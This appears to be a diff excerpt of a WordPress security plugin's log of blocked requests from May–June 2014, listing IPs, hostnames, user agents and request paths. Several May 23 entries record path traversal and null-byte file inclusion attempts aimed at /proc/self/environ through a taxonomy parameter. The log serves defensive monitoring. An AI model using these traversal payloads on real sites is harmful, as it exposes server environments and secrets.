+Host Name: 178.32.49.174
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30)
+
+[403 GET / HEAD Request: Май 19, 2014 - 3:41 пп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 89.28.21.131
+Host Name: 89-28-21-131.starnet.md
 SERVER_PROTOCOL: HTTP/1.0
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
@@ -608,6 +5354,374 @@ HTTP_X_FORWARDED_FOR:
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/wp-content/uploads/2014/01/Recording_20140111_2.mp4
+REQUEST_URI: /
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.6.1; http://localhost/holybunch_prep
+HTTP_USER_AGENT: 
+
+[403 GET / HEAD Request: Май 21, 2014 - 2:04 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 89.28.21.131
+Host Name: 89-28-21-131.starnet.md
+SERVER_PROTOCOL: HTTP/1.0
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET / HEAD Request: Май 23, 2014 - 8:39 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 195.189.82.83
+Host Name: dik8.jumpvps.org
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=/proc/self/environ&term=childhood
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+[403 GET / HEAD Request: Май 23, 2014 - 8:39 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 195.189.82.83
+Host Name: dik8.jumpvps.org
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=/proc/self/environ%00&term=childhood
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+[403 GET / HEAD Request: Май 23, 2014 - 8:39 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 195.189.82.83
+Host Name: dik8.jumpvps.org
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=../../../../../../../../../../proc/self/environ&term=childhood
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+[403 GET / HEAD Request: Май 23, 2014 - 8:39 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 195.189.82.83
+Host Name: dik8.jumpvps.org
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=/../../../../../../../../../../proc/self/environ&term=childhood
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+[403 GET / HEAD Request: Май 23, 2014 - 8:39 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 195.189.82.83
+Host Name: dik8.jumpvps.org
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=../../../../../../../../../../proc/self/environ%00&term=childhood
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+[403 GET / HEAD Request: Май 23, 2014 - 8:39 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 195.189.82.83
+Host Name: dik8.jumpvps.org
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=/../../../../../../../../../../proc/self/environ%00&term=childhood
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+[403 GET / HEAD Request: Май 23, 2014 - 8:39 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 195.189.82.83
+Host Name: dik8.jumpvps.org
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=teaching_topics&term=/proc/self/environ
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+[403 GET / HEAD Request: Май 23, 2014 - 8:39 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 195.189.82.83
+Host Name: dik8.jumpvps.org
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=teaching_topics&term=/proc/self/environ%00
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+[403 GET / HEAD Request: Май 23, 2014 - 8:39 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 195.189.82.83
+Host Name: dik8.jumpvps.org
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=teaching_topics&term=../../../../../../../../../../proc/self/environ
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+[403 GET / HEAD Request: Май 23, 2014 - 8:39 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 195.189.82.83
+Host Name: dik8.jumpvps.org
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=teaching_topics&term=/../../../../../../../../../../proc/self/environ
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+[403 GET / HEAD Request: Май 23, 2014 - 8:39 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 195.189.82.83
+Host Name: dik8.jumpvps.org
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=teaching_topics&term=../../../../../../../../../../proc/self/environ%00
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+[403 GET / HEAD Request: Май 23, 2014 - 8:39 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 195.189.82.83
+Host Name: dik8.jumpvps.org
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=teaching_topics&term=/../../../../../../../../../../proc/self/environ%00
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+[403 GET / HEAD Request: Май 26, 2014 - 3:44 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 54.76.110.8
+Host Name: ec2-54-76-110-8.eu-west-1.compute.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET / HEAD Request: Май 30, 2014 - 5:30 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 183.60.243.187
+Host Name: 183.60.243.187
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)
+
+[403 GET / HEAD Request: Июнь 2, 2014 - 7:44 пп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 23.22.90.226
+Host Name: ec2-23-22-90-226.compute-1.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET / HEAD Request: Июнь 6, 2014 - 2:59 пп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 65.181.123.59
+Host Name: 65.181.123.59
+SERVER_PROTOCOL: HTTP/1.0
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3
+
+[403 GET / HEAD Request: Июнь 7, 2014 - 9:06 пп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 36.75.174.185
+Host Name: 36.75.174.185
+SERVER_PROTOCOL: HTTP/1.0
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3
+
+[403 GET / HEAD Request: Июнь 8, 2014 - 10:54 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 107.170.180.116
+Host Name: 107.170.180.116
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+[403 GET / HEAD Request: Июнь 12, 2014 - 1:56 пп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 162.243.205.164
+Host Name: 162.243.205.164
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+[403 GET / HEAD Request: Июнь 12, 2014 - 2:08 пп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 162.243.205.164
+Host Name: 162.243.205.164
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+[403 GET / HEAD Request: Июнь 16, 2014 - 6:39 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 108.178.32.130
+Host Name: singlehop2.securitykiss.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30)
+
+[403 GET / HEAD Request: Июнь 23, 2014 - 1:54 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 112.123.168.158
+Host Name: YUDI-I7168158
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /administrator/templates/system/css/system.css
+QUERY_STRING: 
+HTTP_USER_AGENT: 
